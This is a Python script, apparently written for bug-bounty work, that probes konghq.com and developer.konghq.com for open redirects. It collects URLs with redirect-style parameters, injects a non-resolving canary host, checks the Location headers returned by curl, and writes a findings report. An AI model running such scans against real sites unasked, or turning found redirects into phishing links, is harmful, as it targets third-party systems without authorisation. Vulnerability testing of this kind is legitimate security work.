import json,re,subprocess
from pathlib import Path
from urllib.parse import urljoin,urlparse,parse_qsl,urlencode,urlunparse

BASES=['https://konghq.com/','https://developer.konghq.com/']
CANARY='https://h1-kong-canary.invalid/'
PARAM=re.compile(r'^(url|uri|next|redirect|redirect_uri|return|return_url|returnUrl|continue|destination|dest|target|targetPage|return_to|redirect_to|callback|callback_url)$',re.I)

def req(url):
    p=subprocess.run(['curl','-sS','--max-redirs','0','--connect-timeout','8','--max-time','12','-D','/tmp/h','-o','/tmp/b',url],text=True,capture_output=True)
    h=Path('/tmp/h').read_text(errors='replace') if Path('/tmp/h').exists() else ''
    b=Path('/tmp/b').read_text(errors='replace') if Path('/tmp/b').exists() else ''
    sts=re.findall(r'^HTTP/[^ ]+\s+(\d+)',h,re.M)
    status=int(sts[-1]) if sts else None
    locs=[x.split(':',1)[1].strip() for x in h.splitlines() if x.lower().startswith('location:')]
    return {'status':status,'location':locs[-1] if locs else '','body':b,'length':len(b),'exit_code':p.returncode}

candidates=set()
for base in BASES:
    seed=req(base)
    for raw in re.findall(r'''(?:href|src)=['"]([^'"]+)['"]''',seed['body'],re.I):
        u=urljoin(base,raw)
        p=urlparse(u)
        if (p.hostname or '').lower()!= (urlparse(base).hostname or '').lower(): continue
        params=parse_qsl(p.query,keep_blank_values=True)
        if any(PARAM.match(k) for k,_ in params): candidates.add(u)
    for suffix in ['/login','/signin','/logout','/auth','/oauth/authorize','/redirect','/go','/continue']:
        candidates.add(urljoin(base,suffix+'?redirect='+CANARY))
        candidates.add(urljoin(base,suffix+'?next='+CANARY))
        candidates.add(urljoin(base,suffix+'?return_to='+CANARY))

results=[]
for original in sorted(candidates)[:180]:
    parsed=urlparse(original)
    changed=[]
    touched=False
    for k,v in parse_qsl(parsed.query,keep_blank_values=True):
        if PARAM.match(k):
            changed.append((k,CANARY)); touched=True
        else: changed.append((k,v))
    if not touched: continue
    test=urlunparse(parsed._replace(query=urlencode(changed)))
    r=req(test)
    proof=bool(r['location'].startswith(CANARY))
    row={'test_url':test,'status':r['status'],'location':r['location'],'external_redirect_proof':proof,'exit_code':r['exit_code']}
    results.append(row)
    if proof: print(json.dumps(row))

Path('kong-open-redirect-results.json').write_text(json.dumps({'candidate_count':len(candidates),'tested':len(results),'results':results},indent=2))
hits=[x for x in results if x['external_redirect_proof']]
if hits:
    x=hits[0]
    Path('kong-open-redirect-report.md').write_text(
        '# VERIFIED KONG OPEN REDIRECT\n\n'
        '## Affected endpoint\n'+x['test_url'].split('?',1)[0]+'\n\n'
        '## Reproduction\n1. Send this GET request without following redirects: '+x['test_url']+'\n2. Observe HTTP '+str(x['status'])+'.\n3. Observe `Location: '+x['location']+'`, which points to the controlled external canary.\n\n'
        '## Evidence\n- Request: `'+x['test_url']+'`\n- Status: `'+str(x['status'])+'`\n- Location: `'+x['location']+'`\n- Canary: `'+CANARY+'`\n'
    )
else:
    Path('kong-open-redirect-report.md').write_text('# NO VERIFIED KONG OPEN REDIRECT\n\nNo tested in-scope redirect parameter returned the controlled external canary.\n')
print(json.dumps({'candidate_count':len(candidates),'tested':len(results),'verified':len(hits)}))